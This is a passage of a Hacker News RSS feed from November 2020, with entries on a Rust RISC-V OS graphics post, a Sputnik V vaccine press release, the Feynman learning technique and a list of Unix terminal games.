<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">let rq = Request3::new(AttachBacking {
	hdr: CtrlHeader {
		ctrl_type: CtrlType::CmdResourceAttachBacking,
		flags: 0,
		fence_id: 0,
		ctx_id: 0,
		padding: 0,
	},
	resource_id: 1,
	nr_entries: 1,
},
MemEntry {
	addr: dev.framebuffer as u64,
	length: dev.width * dev.height * size_of::&lt;Pixel&gt;() as u32,
	…</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/">https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058039</guid>
            <pubDate>Wed, 11 Nov 2020 13:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Visualization of connections between politicians and orgs awarded gov contracts]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25057931">thread link</a>) | @roxanneonhacker
<br/>
November 11, 2020 | https://sophieehill.shinyapps.io/my-little-crony/ | <a href="https://web.archive.org/web/*/https://sophieehill.shinyapps.io/my-little-crony/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>
          A visualization of the connections between
          <strong>Tory politicians</strong>
          and
          <strong>companies being awarded government contracts during the pandemic,</strong>
          based on reporting by
          <a href="https://www.opendemocracy.net/en/dark-money-investigations/">openDemocracy,</a>
          <a href="https://bylinetimes.com/">Byline Times,</a>
          and more.
        </p>
    </div></div>]]>
            </description>
            <link>https://sophieehill.shinyapps.io/my-little-crony/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057931</guid>
            <pubDate>Wed, 11 Nov 2020 12:57:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced System-on-Chip Design Lecture Notes]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25057889">thread link</a>) | @allending
<br/>
November 11, 2020 | https://iis-people.ee.ethz.ch/~gmichi/asocd/lecturenotes/ | <a href="https://web.archive.org/web/*/https://iis-people.ee.ethz.ch/~gmichi/asocd/lecturenotes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://iis-people.ee.ethz.ch/~gmichi/asocd/lecturenotes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057889</guid>
            <pubDate>Wed, 11 Nov 2020 12:51:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[92% efficacy of Sputnik V Covid-19 vaccine]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057881">thread link</a>) | @pama
<br/>
November 11, 2020 | https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/ | <a href="https://web.archive.org/web/*/https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<ul>
<li><i>The Sputnik V vaccine efficacy amounted to 92% (calculation based on the 20 confirmed COVID-19 cases split between vaccinated individuals and those who received the placebo). Currently 40,000 volunteers are taking part in double-blind, randomized, placebo-controlled Phase III of Sputnik V clinical trials, out of which over 20,000 have been vaccinated with the first dose of the vaccine and more than 16,000 with both the first and second doses of the vaccine. </i></li>
<li><i>Efficacy was demonstrated on the basis of a first interim analysis obtained 21 days after the first injection. </i></li>
<li><i>There were no unexpected adverse events during the trials. Monitoring of the participants is ongoing. </i></li>
<li><i>The world’s first registration of COVID-19 vaccine, done in Russia on the 11th of August under the emergency use authorization mechanism, enables the Russian Federation to administer the vaccine outside of the clinical trials to volunteers such as medics and other high-risk groups. Trials conducted under the civil use of the vaccine in Russia (not being a part of clinical trials) based on the monitoring of additional 10,000 vaccinated confirmed vaccine efficacy at a rate of over 90%. </i></li>
<li><i>The interim research data will be published by the Gamaleya Center team in one of the leading international peer-reviewed medical journals. Following the completion of Phase III clinical trials of the Sputnik V vaccine, Gamaleya Center will provide access to the full clinical trial report. </i></li>
<li><i>Currently Sputnik V Phase III clinical trials are approved and are undergoing in Belarus, UAE, Venezuela and other countries, as well as Phase II-III – in India. </i></li>
<li><i>The Sputnik V vaccine is based on a well-studied human adenoviral vector platform that had proven safe and effective with no long-term side effects in more than 250 clinical trials globally conducted during the past two decades (while the history of use of human adenoviruses in vaccine development started in 1953). More than 100,000 people have received approved and registered drugs based on the human adenoviral vectors. </i></li>
<li><i>The uniqueness of the Russian vaccine is in using two different human adenoviral vectors that enable to provide strong and long-term immune response after the second injection.</i> </li>
</ul>
<p>
<b>Moscow, 11.11.2020</b> – The National Research Center for Epidemiology and Microbiology named after N.F. Gamaleya of the Ministry of Health of the Russian Federation (Gamaleya Center) and the Russian Direct Investment Fund (RDIF, Russia’s sovereign wealth fund), announce that the Sputnik V vaccine, the world's first registered vaccine against coronavirus (registered on the 11th of August under the emergency use authorization mechanism) created on the well-studied platform of human adenoviral vectors, demonstrated high efficacy. The confirmation is based on the first interim data from the largest double-blind, randomized, placebo-controlled Phase III clinical trials in Russia involving 40,000 volunteers.
</p>
<p>
The trials evaluated efficacy among over 16,000 volunteers who received the vaccine or placebo 21 days after the first injection. As a result of a statistical analysis of 20 confirmed cases of coronavirus, the case split between vaccinated individuals and those who received the placebo indicates that the Sputnik V vaccine had an efficacy rate of 92% after the second dose.
</p>
<p>
Separately, in September the vaccine was first administered to a group of volunteers from the “red zones” of Russian hospitals. The observation of additional 10,000 vaccinated volunteers representing medics and other high-risk groups under the civil use of the vaccine out of clinical trials also confirmed the vaccine’s efficacy rate of over 90 percent.
</p>
<p>
The data received will be published by Gamaleya&nbsp;Center researchers in one of the world’s leading peer-reviewed medical academic journals following an independent valuation of the data by leading epidemiology experts. Following the completion of Phase III clinical trials of the Sputnik V vaccine, Gamaleya Center will provide access to the full clinical trial report.
</p>
<p>
As of November 11, as part of the clinical trials in Russia’s 29 medical centers, more than 20,000 volunteers were vaccinated with first dose and over 16,000 volunteers with the first and the second dose of the vaccine.
</p>
<p>
In addition, as of November 11, no unexpected adverse events were identified as part of the research. Some of those vaccinated had short-term minor adverse events such as pain at the injection site, flu-like syndrome including fever, weakness, fatigue, and headache.
</p>
<p>
During the clinical trials, the safety of the vaccine is constantly being monitored; information is analysed by the Independent Monitoring Committee comprising of leading Russian scientists. Collection, quality control and data processing is conducted in line with ICH GCP standards and involving active participation of Moscow’s Health Department and Crocus Medical, the contract research organization (CRO).
</p>
<p>
Observation of study participants will continue for six months after which the final report will be presented. Currently Sputnik V Phase III clinical trials are approved and are undergoing in Belarus, the UAE, Venezuela and other countries, as well as Phase II-III in India. A separate detailed study of the vaccine’s safety and immunogenicity for elderly people is being conducted.
</p>
<p>
The research data will be provided by RDIF to the national regulators of countries interested in purchasing the Russian vaccine in order to streamline the registration process.
</p>
<p>
<b>Mikhail Murashko, Minister of Health of the Russian Federation: </b><br>
“The use of the vaccine and the results of clinical trials demonstrate that it is an efficient solution to stop the spread of coronavirus infection, а preventive healthcare tool, and this is the most successful path to defeat the pandemic.”
</p>
<p>
<b>Alexander Gintsburg, Gamaleya Center Director: </b><br>
“The publication of the interim results of the post-registration clinical trials that convincingly demonstrate Sputnik V vaccine’s efficacy gives way to mass vaccination in Russia against COVID-19 in the coming weeks. Thanks to the production scale up at new manufacturing sites, Sputnik V vaccine will soon be available for a wider population. This will break the current trend and lead to an eventual decrease in COVID-19 infection rates, first in Russia, then globally.”
</p>
<p>
<b>Denis Logunov, Gamaleya Center Deputy Director: </b><br>
“Positive interim results of Phase III give reasons to expect a successful outcome of Sputnik V clinical trials. We will continue to process and analyse all the data and look to the future with optimism, expecting that results of our work will help end the pandemic sooner.”
</p>
<p>
<b>Kirill Dmitriev, CEO, Russian Direct Investment Fund: </b><br>
“Sputnik V is the first registered vaccine against COVID-19 in the world, the vaccine is based on safe and effective platform of human adenoviral vectors. More and more countries are recognizing the human adenoviral vector platform and plan to include these vaccines, as the most studied and known, in their respective national vaccine portfolio. I would also like to stress the importance of international cooperation and close partnership among vaccine-developing states. Vaccines should be above politics. The world needs a diversified portfolio of high-quality vaccines with Sputnik V, based on the well-tested human adenoviral vector platform, being an important element of it.”
</p>
<p>
The safety of vaccines based on human adenoviruses was confirmed in more than 75 international publications and more than 250 clinical trials conducted during the past two decades (while the history of use of human adenoviruses in vaccine development started in 1953). Adenovirus vectors are genetically modified viruses of the regular flu that cannot reproduce in a human body. When Sputnik V vaccine is used, the coronavirus itself does not enter the body as the vaccine only contains genetic information about part of its outer protein coat, the so called "spikes" forming its crown. This completely eliminates the possibility of getting infected as a result of vaccination while also causing the body's stable immune response.
</p>
<p>
On September 4, The Lancet, one of world’s leading medical journals, published a research paper on the results of Phase I and Phase II clinical trials of the vaccine that showed no serious adverse events and an effective immune response of those vaccinated.
</p>
<p>
Requests for more than 1.2 billion doses of Sputnik V vaccine came from over 50 countries. The vaccine supplies for the global market will be produced by RDIF’s international partners in India, Brazil, China, South Korea and other countries. The existing RDIF contracts with international partners enable the production of 500 million doses of the Sputnik V vaccine outside Russia annually. RDIF is now considering additional requests from a number of countries and companies to further increase its foreign production capacities.
</p>
<p>
On August 11, the Sputnik V vaccine developed by the Gamaleya Center was registered by Russia’s Health Ministry and became the world’s first registered vaccine against COVID-19. Detailed information on the Sputnik V vaccine, its human adenoviral vectors technological platform, and other details are available at&nbsp;<a href="http://" target="_blank">sputnikvaccine.com</a><a target="_blank" href="http://"></a>
</p>
<p>
<b>Be the first to learn about Sputnik V on social networks:</b>
</p>
<p>
<a href="https://twitter.com/sputnikvaccine" target="_blank">Twitter</a>
</p>
<p>
<a href="https://www.facebook.com/sputnikvaccine" target="_blank">Facebook</a>
</p>
<p>
<a href="https://www.instagram.com/sputnik_vaccine/" target="_blank">Instagram</a>
</p>
<p>
<a href="https://www.youtube.com/channel/UCLvQuKL3Nn7NnT9Jyi_dlgQ" target="_blank">Youtube</a>
</p>
<p>
***
</p>
<p>
<b>Russian Direct Investment Fund (RDIF) </b>is Russia's sovereign wealth fund established in 2011 to make equity co-investments, primarily in Russia, alongside reputable international financial and strategic investors. RDIF acts as a catalyst for direct investment in the Russian economy. RDIF’s management company is based in Moscow. Currently, RDIF has experience of the successful joint implementation of more than 80 projects with foreign partners totaling more than RUB1.9 trillion and covering 95% of the regions of the Russian Federation. RDIF portfolio companies employ more than 800,000 people and generate revenues which …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/">https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/</a></em></p>]]>
            </description>
            <link>https://sputnikvaccine.com/newsroom/pressreleases/the-first-interim-data-analysis-of-the-sputnik-v-vaccine-against-covid-19-phase-iii-clinical-trials-/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057881</guid>
            <pubDate>Wed, 11 Nov 2020 12:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Richard Feynman and How to Learn Anything Well]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25057821">thread link</a>) | @stanrivers
<br/>
November 11, 2020 | https://www.butwhatfor.com/feynman-technique/ | <a href="https://web.archive.org/web/*/https://www.butwhatfor.com/feynman-technique/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Disclosure: Links to Amazon are generally affiliated links. As an Amazon Associate, we earn from qualifying purchases, meaning a commission may be generated on purchased items.</p><div>
<div>
<div>
<div>
<p><strong><a href="https://www.butwhatfor.com/richard-feynman/">Richard P. Feynman </a></strong> (1918 – 1988) was an American theoretical physicist often referred to as “The Great Explainer” due to his ability to make complex topics understandable. While he won the Nobel Price in Physics in 1965 for his work developing quantum electrodynamics, today he is also famous for his forays into bongo drum playing, Tuvan throat singing, and safe cracking.</p>
<div>
<figure>
<p><a href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa27b9e93-62e5-4bb9-9632-c333e7503580_600x315.jpeg" target="_blank" rel="noopener noreferrer"><br>
<img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa27b9e93-62e5-4bb9-9632-c333e7503580_600x315.jpeg" alt="" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a27b9e93-62e5-4bb9-9632-c333e7503580_600x315.jpeg&quot;,&quot;height&quot;:315,&quot;width&quot;:600,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:53211,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}"><br>
</a></p>
</figure>
</div>
<p data-pm-context="[]">It is 1941 and you have a problem. While you haven’t yet gotten around to defining quantum electrodynamics or even started your work helping design the atomic bomb, you are nearing the end of your second year of graduate school. This means you have an exam soon.</p>
<p>That’s OK though. You know what to do. After all, you have made it this far already. You just do what you always do – you pull out a notebook. And not just any notebook, but one especially well-prepared for the task at hand. Namely, a blank one.</p>
<p>A fitting title is needed for the first page. You think for a moment, smiling to yourself as you creatively run through all the options you could pick. But, alas, none of them seem right. You opt for the tried-and-true but never worn out choice. You write it down.</p>
<p>You are Richard P. Feynman, arguably the brightest young physics mind in the United States at the time, and you have just written “Notebook Of Things I Don’t Know About” on the title page.</p>
<p><em>Note: For more on Richard Feynman, check out <a href="https://amzn.to/36pgDxt">Genius: The Life and Science of Richard Feynman, </a>the definitive biography by James Gleick, or Feynman’s autobiographical writings in<a href="https://amzn.to/35krIk7"> “Surely You’re Joking, Mr. Feynman!”</a></em></p>
<h4>The Feynman Learning Technique</h4>
<p>Feynman realized early on that people can trick themselves into believing they understand something more deeply than they truly do. This self-delusion often comes from an earnest effort focused on learning the wrong thing – learning the name of something as opposed to that which it truly is.</p>
<blockquote><p>The next Monday we were playing in a field, and a kid said to me, “What’s that bird? Do you know the name of that bird?” I said, “I haven’t the slightest idea.” He said, “Well, it is a brown‑throated thrush.” He said, “Your father doesn’t teach you anything.”</p>

<p>But my father had already taught me about the names of birds. Once we walked, and he said, “That is a brown-throated thrush. In German it is called the Pfleegel flügel. In Chinese it is called Keewontong. In Japanese a Towhatowharra”, and so on.</p>

<p>And when you know all the names of that bird in every language, you know nothing, know absolutely nothing, about the bird… So I had learned already that names don’t constitute knowledge…</p>

<p>We have to learn that these are the kinds of disciplines in the field of science that you have to learn – to know when you know, and when you don’t know, and what it is you know, and what it is you don’t know.</p>

<p>You’ve got to be very careful not to confuse yourself.</p></blockquote>
<p>Understanding this, Feynman was very careful to not delude himself into a superficial understanding of important topics. He developed a more holistic, multidisciplinary approach to learning that served him well throughout his career. While never specifically stated by Feynman as a set technique with steps, Feynman loved sharing with others enough that we can piece together his teachings, along with stories of his life, to better understand how he naturally approached learning anything new.</p>
<p>The combination of ideas, which many different authors outline slightly differently but are holistically the same, is known as <em>The Feynman Learning Technique</em>.</p>
<p>So how does this technique actually work?</p>
<h4>Step 1: Whatever you are trying to learn, take a stab at learning it</h4>
<p>The way that Feynman learned and internalized new ideas was to first attack them head on the old fashioned way – by reading and thinking through them. The key emphasis in that sentence is on the word <em>thinking</em>. Famously, Feynman would read the abstract of a scientific paper, and before reading any further, attempt to solve the stated problem. Only then would he read through the rest of the paper. He was focused on mentally wrestling with an idea as opposed to letting someone else walk him to the final answer.</p>
<p>So the first step in the process is to pick something that you need (or better yet, desire) to learn and spend time with the new idea until you have internalized it to the best of your ability.</p>
<p>Now, you might aptly question, “What is this <em>hogwash</em>? Step 1 of this supposed wonderfully useful learning technique is to learn something? I’m out.”</p>
<p>Stop your <em>swining</em> and don’t worry – there is more to it than that. Which brings us to the second step.</p>
<h4>Step 2: Write everything down, in as simple a way as possible, as if you were preparing a lecture for an inquisitive child</h4>
<p>This is where the notebook comes in. Open it. Close everything else.</p>
<p>From memory, write down everything you can about what you are trying to learn as if you were preparing to teach it to someone else. Preferably, pretend you are planning to teach the topic to a child – the more you can simplify your language and the ideas, the more likely you are to find areas where you are hiding behind the name of something as opposed to true understanding.</p>
<blockquote><p>Test it this way: You say, “Without using the new word which you have just learned, try to rephrase what you have just learned in your own language. Without using the word ‘energy,’ tell me what you know now about the dog’s motion.” You cannot. So you learned nothing about science. That may be all right. You may not want to learn something about science right away.</p>

<p>You have to learn definitions. But for the very first lesson, is that not possibly destructive?</p></blockquote>
<p>At this point, you will probably notice that there are things that you are missing or don’t remember as well as you thought you did. Write those items down – make a list of all the things you don’t know.</p>
<p>Now open everything back up and search out the answers to those items. Get to a point where you feel like you have conveyed what is required for your theoretical student to deeply understand the topic.</p>

<h4>Step 3: Ask questions as if you were a child to identify gaps in your understanding</h4>
<p data-pm-context="[]">Now you need to channel your inner child. Feynman’s neverending child-like curiosity is often viewed as the core, natural foundation that differentiated Feynman from other equally intelligent individuals. As children are wont to do, <a href="https://www.butwhatfor.com/invert-always-invert-avoid-failure-to-succeed/">start questioning every line you have written down</a>.</p>
<p>If we take a concept – for example, the calculation of <a href="https://www.investopedia.com/terms/n/npv.asp">net present value</a>. Why do we discount cash received in the future? How do you choose a discount rate? Can the rate change between people? Should it change over time? Can you use a different discount rate in different periods? How many years of cash do you think about? How do you determine what those cash numbers will be in the future? What happens if cash is negative in the future? And so on.</p>
<p>If you are seeking Feynman-level understanding, it is not enough to merely know the math formula as that is akin to just knowing the name of something. You need to understand the information qualitatively and quantitatively supporting the formula – only then should you feel confident in your understanding.</p>
<p>As you write out these new questions, you’ll find you can answer some of these. Maybe even most of these. However, at some point, you will run out of answers for the incessant child – write all these things down as items you “don’t know about.” Then go find the answers to these new topics.</p>
<p>By doing this, you are strengthening the foundation upon which your primary new learnings are ingrained in your head.</p>
<blockquote><p>But the problem, you see, when you ask&nbsp;<em>why</em>&nbsp;something happens, how does a person answer why something happens? For example, Aunt Minnie is in the hospital. <em>Why?</em> Because she went out, slipped on the ice, and broke her hip. That satisfies people. It satisfies, but it wouldn’t satisfy someone who came from another planet and who knew nothing about why when you break your hip do you go to the hospital…</p>

<p>And you begin to get a very interesting understanding of the world and all its complications. If you try to follow anything up, you go deeper and deeper in various directions. For example, if you go, “<em>Why did she slip on the ice?”</em> Well, ice is slippery. Everybody knows that, no problem. But you ask&nbsp;<em>why is ice slippery?</em>&nbsp;That’s kinda curious. Ice is extremely slippery. It’s very interesting. <em>You say, how does it work?</em> You could either say, “I’m satisfied that you’ve answered me. Ice is slippery; that explains it,” or you could go on and say, “<em>Why is ice slippery?”</em> and then you’re involved with something, because there aren’t many things as slippery as ice…</p>

<p><em>A solid that’s so slippery?</em> Because it is, in the case of ice, when you stand on it (they say) momentarily the pressure melts the ice a little bit so you get a sort of instantaneous water surface on which you’re slipping. W<em>hy on ice and not on other things?</em> Because water expands when it freezes, so the pressure tries to undo the expansion and melts it. It’s capable of melting, but other substances get cracked when they’re freezing, and when you push them they’re satisfied to be solid.</p>

<p><em>Why does water expand when it freezes and other substances don’t?</em> I’m not answering your question, but I’m telling you how difficult the&nbsp;<em>why&nbsp;</em>question is. You have to know what it is that you’re permitted to understand and allow to be understood and known, and what it is you’re not. You’ll notice, in this example, that the more I ask why, the deeper a thing is, the more interesting it gets. We could even go further and say, “<em>Why did she fall down when she slipped?”</em> It has to do with gravity, involves all the planets and everything else. Nevermind! It goes on and on.</p></blockquote>

<h4>Step 4: Repeat step 3 until the questioning adds no incremental value</h4>
<p data-pm-context="[]">Now you iterate with yourself. After you have written down the …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.butwhatfor.com/feynman-technique/">https://www.butwhatfor.com/feynman-technique/</a></em></p>]]>
            </description>
            <link>https://www.butwhatfor.com/feynman-technique/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057821</guid>
            <pubDate>Wed, 11 Nov 2020 12:39:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started with PromQL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057754">thread link</a>) | @thechiefio
<br/>
November 11, 2020 | https://thechief.io/c/metricfire/getting-started-promql/ | <a href="https://web.archive.org/web/*/https://thechief.io/c/metricfire/getting-started-promql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://thechief.io/c/metricfire/getting-started-promql/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057754</guid>
            <pubDate>Wed, 11 Nov 2020 12:25:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unix ASCII Games]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057750">thread link</a>) | @elvis70
<br/>
November 11, 2020 | https://ligurio.github.io/awesome-ttygames/ | <a href="https://web.archive.org/web/*/https://ligurio.github.io/awesome-ttygames/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>

      

<p><a href="https://travis-ci.org/ligurio/awesome-ttygames"><img src="https://travis-ci.org/ligurio/awesome-ttygames.svg?branch=master" alt="Build Status"></a></p>

<p>See additional resources about games in console:</p>
<ul>
  <li>https://inconsolation.wordpress.com/tag/game/</li>
  <li>https://ttygames.wordpress.com/</li>
  <li>https://theouterlinux.gitlab.io/RecommendedSoftware/Linux/Games/RecommendedSoftware_Linux_Games.html</li>
</ul>

<p>Feel free to submit pull requests to add new games and improve information about
those already in the database.</p>

<h2 id="how-to-contribute">How to contribute</h2>

<p>Check <code>games.yaml</code> out. All information is inside, and you should more or less
understand what’s going on by reading it. Sorting is alphabetical.</p>

<p>Simplest way to contribute: edit <a href="https://ligurio.github.io/awesome-ttygames/games.yaml">games.yaml</a>, and then
your changes will be submitted as a pull request.</p>

<p>Use this template:</p>

<div><div><pre><code>- name: hangman
  url: http://www.openbsd.org/cgi-bin/man.cgi/OpenBSD-current/man6/hangman.6?query=hangman&amp;sec=6&amp;arch=i386
  info: computer version of the game hangman
  screencast:
  play:
</code></pre></div></div>

<ul>
  <li><code>name</code>: Name of the game</li>
  <li><code>url</code>: URL of main page</li>
  <li><code>info</code>: free text with game description</li>
  <li><code>screencast</code>: link to screencast (for example on asciinema)</li>
  <li><code>play</code>: server hostname where game is available via telnet or ssh</li>
</ul>

<h2 id="license">License</h2>

<p><a href="http://creativecommons.org/publicdomain/zero/1.0/"><img src="http://i.creativecommons.org/p/zero/1.0/88x31.png" alt="CC0 Public Domain"></a></p>

<p>To the extent possible under law, <a href="https://bronevichok.ru/">Sergey Bronnikov</a> has
waived all copyright and related or neighboring rights to this work.</p>

<h3 id="0verkill">0verkill</h3>

<p>0verkill is bloody 2D action deathmatch-like game in ASCII-ART.</p>

<h3 id="2048"><a href="https://github.com/mevdschee/2048.c">2048</a></h3>

<p>This is an ncurses version of the game ‘2048’.</p>

<h3 id="2048-cli"><a href="https://github.com/Tiehuis/2048-cli">2048-cli</a></h3>

<p><a href="https://asciinema.org/a/34067"><img src="https://asciinema.org/a/34067.svg" alt="asciicast"></a></p>

<p>A cli version of the game 2048 for your Linux terminal.</p>

<h3 id="n2048"><a href="http://freshmeat.sourceforge.net/projects/n2048">n2048</a></h3>

<p><a href="https://asciinema.org/a/35973"><img src="https://asciinema.org/a/35973.svg" alt="asciicast"></a></p>

<p>n2048 is a console-based game based on the highly addictive sliding puzzle 2048. Slide the tiles together to combine them, until you reach the highest one.</p>

<h3 id="ascii-patrol"><a href="http://ascii-patrol.com/">ascii patrol</a></h3>

<p>None</p>

<p><strong>Play</strong>: <code>http://ascii-patrol.com/area51/ascii-patrol-html5.html</code></p>

<h3 id="abura-tan"><a href="http://aburatan.sourceforge.net/">abura tan</a></h3>

<p>A roguelike game of Cowboy Knights and Lurking Horror.</p>

<h3 id="ad-astra"><a href="https://code.google.com/archive/p/ad-astra-game/">ad astra</a></h3>

<p>Ad Astra is a turn-based space strategy game written in Python that uses curses for its display.</p>

<h3 id="adom-ancient-domains-of-mystery"><a href="https://www.adom.de/">ADOM (Ancient Domains of Mystery)</a></h3>

<p>ADOM is a roguelike game.</p>

<h3 id="adventure"><a href="https://man.openbsd.org/OpenBSD-current/man6/adventure.6">adventure</a></h3>

<p>An exploration game. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Colossal_Cave_Adventure">Wikipedia</a>.</p>

<p><strong>Play</strong>: <code>https://grack.com/demos/adventure/</code></p>

<h3 id="alienrl"><a href="https://alien.chaosforge.org/">alienrl</a></h3>

<p>AliensRL is a tactical roguelike game, inspired by the “Aliens” movie.</p>

<h3 id="alienwave"><a href="https://www.alessandropira.org/alienwave/aw.html">alienwave</a></h3>

<p>another good variant of the space invaders game.</p>

<h3 id="angband"><a href="https://rephial.org/">angband</a></h3>

<p>Angband is a free, single-player dungeon exploration game.</p>

<h3 id="anonymine"><a href="https://oskog97.com/projects/anonymine/">Anonymine</a></h3>

<p><a href="https://asciinema.org/a/82455"><img src="https://asciinema.org/a/82455.svg" alt="asciicast"></a></p>

<p>A curses mode minesweeper solvable without guessing, and the only with von Neumann neighbourhoods.</p>

<p><strong>Play</strong>: <code>ssh play@anonymine-demo.oskog97.com -p 2222; Password is "play"</code></p>

<h3 id="aop"><a href="https://raffi.at/view/code/aop">aop</a></h3>

<p><a href="https://asciinema.org/a/34678"><img src="https://asciinema.org/a/34678.svg" alt="asciicast"></a></p>

<p>Ambassador of Pain (aop). A very nice and challenging arcade game.</p>

<h3 id="apple-trek"><a href="http://peyre.x10.mx/GWBASIC/index.htm#AppleTrek">Apple Trek</a></h3>

<p>See also <a href="https://en.wikipedia.org/wiki/Apple_Trek">Wikipedia</a>.</p>

<h3 id="arkanoid-bash"><a href="https://github.com/bolknote/shellgames/blob/master/arcanoid.sh">arkanoid-bash</a></h3>

<p><a href="https://asciinema.org/a/36415"><img src="https://asciinema.org/a/36415.svg" alt="asciicast"></a></p>

<p>Arkanoid is an arcade game developed by Taito in 1986. Written in Bash.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Arkanoid">Wikipedia</a>.</p>

<h3 id="arkanoidpy"><a href="https://blog.yjl.im/2015/12/arkanoid-example-from-pygamii-ascii.html">arkanoid.py</a></h3>

<p>Arkanoid is an arcade game developed by Taito in 1986. Written in Python.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Arkanoid">Wikipedia</a>.</p>

<h3 id="arkanoid-sed"><a href="http://sed.sourceforge.net/local/games/arkanoid.sed.html">arkanoid-sed</a></h3>

<p>Arkanoid is an arcade game developed by Taito in 1986. Written in Sed.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Arkanoid">Wikipedia</a>.</p>

<h3 id="arithmetic"><a href="https://man.openbsd.org/arithmetic.6">arithmetic</a></h3>

<p>quiz on simple arithmetic</p>

<h3 id="asciijump"><a href="http://freshmeat.sourceforge.net/projects/asciijump">asciijump</a></h3>

<p><a href="https://asciinema.org/a/31340"><img src="https://asciinema.org/a/31340.svg" alt="asciicast"></a></p>

<p>asciijump is an ASCII art game about ski jumping.</p>

<h3 id="ascii-portal"><a href="https://github.com/cymonsgames/ASCIIpOrtal">ascii portal</a></h3>

<p>ASCIIpOrtal is a text based puzzle game inspired by the popular video game.</p>

<h3 id="asciisector"><a href="http://www.asciisector.net/">asciisector</a></h3>

<p>asciisector is a free space combat/exploration/trading game.</p>

<h3 id="astwar"><a href="https://savannah.nongnu.org/projects/astwar">astwar</a></h3>

<p>Astwar is a ncurses based game that features two little ships on each side of the screen shooting each other.</p>

<h3 id="atc"><a href="https://man.openbsd.org/OpenBSD-current/man6/atc.6">atc</a></h3>

<p>air traffic controller game. It’s a BSD game.</p>

<h3 id="avanor"><a href="http://avanor.sourceforge.net/">avanor</a></h3>

<p>Rogue-like game with easy ADOM-like user interface.</p>

<h3 id="awkaster"><a href="https://github.com/TheMozg/awk-raycaster">awkaster</a></h3>

<p>Pseudo-3D shooter written completely in gawk using raycasting technique</p>

<h3 id="backgammon"><a href="https://man.openbsd.org/OpenBSD-current/man6/backgammon.6">backgammon</a></h3>

<p>A backgammon game; you can play against the computer. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Backgammon">Wikipedia</a>.</p>

<h3 id="bastet"><a href="http://fph.altervista.org/prog/bastet.html">bastet</a></h3>

<p>Bastet (short for Bastard Tetris).</p>

<h3 id="battleships"><a href="http://www.catb.org/~esr/bs/">battleships</a></h3>

<p>Uses character-cell graphics with a visual point-and-shoot interface.</p>

<h3 id="battlestar"><a href="https://man.openbsd.org/OpenBSD-current/man6/battlestar.6">battlestar</a></h3>

<p>A tropical adventure game. It’s a BSD game.</p>

<h3 id="bcd"><a href="https://man.openbsd.org/bcd.6">bcd</a></h3>

<p>punched card</p>

